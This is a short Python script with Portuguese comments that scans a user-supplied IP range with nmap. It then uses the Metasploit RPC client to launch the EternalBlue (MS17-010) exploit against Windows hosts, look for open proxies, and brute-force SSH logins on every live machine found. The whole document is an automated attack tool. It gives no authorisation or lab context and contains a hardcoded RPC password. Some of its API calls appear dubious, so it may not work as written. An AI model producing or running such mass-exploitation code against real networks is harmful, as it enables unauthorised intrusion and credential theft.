from metasploit.msfrpc import MsfRpcClient
import nmap

# Pede ao usuário para inserir a faixa de endereços IP da rede a ser varrida
network = input('Insira a faixa de endereços IP da rede a ser varrida (exemplo: 192.168.1.0/24): ')

# Cria um objeto nmap para varrer a rede em busca de hosts ativos
nm = nmap.PortScanner()
nm.scan(hosts=network, arguments='-sn')

# Cria um objeto msfrpc para se conectar ao serviço RPC do Metasploit
client = MsfRpcClient('password')

# Varre todos os hosts ativos em busca de vulnerabilidades
for host in nm.all_hosts():
    try:
        # Configura o módulo do Metasploit a ser usado
        smb_module = client.modules.use('scanner/smb/smb_version')
        smb_module['RHOSTS'] = host
        smb_module.execute()

        # Verifica se o host está executando o Windows
        os_name = smb_module.get_output('os_name').split(',')[0].strip()
        if os_name.startswith('Windows'):
            # Se o host estiver executando o Windows, use o módulo smb_ms17_010 para procurar a vulnerabilidade EternalBlue
            ms17_010_module = client.modules.use('exploit/windows/smb/ms17_010_eternalblue')
            ms17_010_module['RHOST'] = host
            ms17_010_module.execute()

        # Use o módulo http_open_proxy para procurar servidores proxy abertos
        http_module = client.modules.use('scanner/http/http_open_proxy')
        http_module['RHOSTS'] = host
        http_module.execute()

        # Use o módulo ssh_login para procurar credenciais SSH fracas
        ssh_module = client.modules.use('scanner/ssh/ssh_login')
        ssh_module['RHOSTS'] = host
        ssh_module.execute()

        # Exibe os resultados
        print('Vulnerabilidades encontradas em %s:' % host)
        for event in client.events:
            print(event['message'])
    except:
        pass
